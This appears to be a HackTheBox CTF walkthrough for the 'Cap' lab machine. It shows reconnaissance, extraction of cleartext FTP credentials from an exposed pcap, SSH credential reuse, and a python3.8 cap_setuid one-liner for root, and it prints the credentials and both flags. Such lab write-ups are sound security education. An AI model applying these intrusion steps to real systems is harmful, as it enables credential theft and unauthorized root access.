---
layout: default
title: "HackTheBox — Cap Walkthrough (10.10.10.245)"
---

# 🚩 HackTheBox — Cap Walkthrough

Welcome to my detailed walkthrough of the **Cap** machine on HackTheBox.  
This writeup takes you through **enumeration → exploitation → privilege escalation**, with commands, outputs, and commentary, so you don’t just follow along but *understand each step*.

---

## 🕵️ Reconnaissance

The first step is always to see what the target is running.  
Using **Nmap** with scripts and version detection:

```bash
nmap -sC -sV -oN nmap_scan.txt 10.10.10.245
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn (http-server-header: gunicorn)
```

So we have:
- **FTP** (21)  
- **SSH** (22)  
- **HTTP** (80)  

The web service claims to be a **Security Dashboard**. Suspicious and interesting 😎

---

## 🌐 Web Enumeration

Browsing to `http://10.10.10.245/` shows a **Security Dashboard**.  
Digging deeper, I noticed a `/data/` directory containing a `.pcap` capture file.

👉 Whenever you see `.pcap` files exposed on a challenge, it’s basically free treasure. Let’s grab it:

```bash
wget http://10.10.10.245/data/1.pcap -O cap.pcap
```

---

## 📡 PCAP Analysis

I opened the file with `tshark` to look at FTP credentials:

```bash
tshark -r cap.pcap -Y "ftp.request.command == \"USER\" or ftp.request.command == \"PASS\""        -T fields -e ftp.request.command -e ftp.request.arg
```

**Output:**
```
USER nathan
PASS Buck3tH4TF0RM3!
```

🔥 Jackpot — cleartext FTP credentials!  

---

## 🔑 Getting Access

First, I verified the credentials via FTP:

```bash
ftp 10.10.10.245
# login: nathan / Buck3tH4TF0RM3!
```

That worked. Since SSH was also open, I tried the same credentials there:

```bash
ssh nathan@10.10.10.245
```

💡 Success — we’re in as **nathan**!

---

## 🧑‍💻 User Flag

Navigating to Nathan’s home directory:

```bash
cat user.txt
```

**Flag:**  
```
6e89061b7afba09dfa066e55e390c53d
```

---

## ⬆️ Privilege Escalation

Time to go root. Running **linpeas** (or manual checks) revealed something spicy:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

That means **Python3.8 has special Linux capabilities** which allow it to set the user ID. In simple terms: it can make itself root.

### Exploit with a one-liner:
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Boom 💥 — we’re root.

---

## 👑 Root Flag

Now that we have root, let’s grab the final flag:

```bash
cat /root/root.txt
```

**Flag:**  
```
69d7ea1977e866c3e9ba8c5ff6abe8f0
```

---

## 📝 Lessons Learned

- `.pcap` files can leak **sensitive credentials** (FTP cleartext login in this case).  
- **Linux capabilities** can be as dangerous as `SUID` binaries if misconfigured.  
- Always check binaries with `getcap -r / 2>/dev/null`.

---

## 🎯 Final Thoughts

This was a neat box:
- Light recon → web → pcap analysis  
- Quick creds reuse for SSH  
- Clever privilege escalation via Python capabilities  

It’s a perfect beginner-friendly machine that teaches:
- Traffic capture analysis
- Credential harvesting
- Misconfigured binary exploitation

Happy hacking! ⚡
